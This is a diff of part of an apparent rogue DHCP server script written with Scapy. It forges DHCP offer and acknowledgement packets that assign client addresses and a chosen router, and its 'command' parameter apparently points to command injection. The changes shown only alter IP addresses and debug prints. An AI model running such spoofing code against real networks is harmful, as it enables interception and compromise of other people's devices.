@@ -37,11 +37,11 @@ def get_option(dhcp_options, key):
 
 def dhcp_offer(raw_mac, xid):
     packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.1.111", dst='192.168.1.255') /
+              IP(src="192.168.0.100", dst='192.168.0.255') /
               UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.1.111', xid=xid) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.0.100', xid=xid) /
               DHCP(options=[("message-type", "offer"),
-                            ('server_id', '192.168.1.111'),
+                            ('server_id', '192.168.0.100'),
                             ('subnet_mask', '255.255.255.0'),
                             ('router', '192.168.2.5'),
                             ('lease_time', 172800),
@@ -54,11 +54,11 @@ def dhcp_offer(raw_mac, xid):
 
 def dhcp_ack(raw_mac, xid, command, requested_addr):
     packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.1.111", dst='192.168.1.255') /
+              IP(src="192.168.0.100", dst='192.168.0.255') /
               UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=requested_addr, siaddr='192.168.1.111', xid=xid) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=requested_addr, siaddr='192.168.0.100', xid=xid) /
               DHCP(options=[("message-type", "ack"),
-                            ('server_id', '192.168.1.111'),
+                            ('server_id', '192.168.0.100'),
                             ('subnet_mask', '255.255.255.0'),
                             ('router', '192.168.2.5'),
                             ('lease_time', 172800),
@@ -81,7 +81,7 @@ def handle_dhcp_packet(packet):
             print('---')
             print('New DHCP Discover')
             print(packet.summary())
-            print(ls(packet))
+            # print(ls(packet))
             # print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
             hostname = get_option(packet[DHCP].options, 'hostname')
             print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")
@@ -115,7 +115,7 @@ def handle_dhcp_packet(packet):
             print('---')
             print('New DHCP Request')
             print(packet.summary())
-            print(ls(packet))
+            # print(ls(packet))
 
             requested_addr = get_option(packet[DHCP].options, 'requested_addr')
             hostname = get_option(packet[DHCP].options, 'hostname')
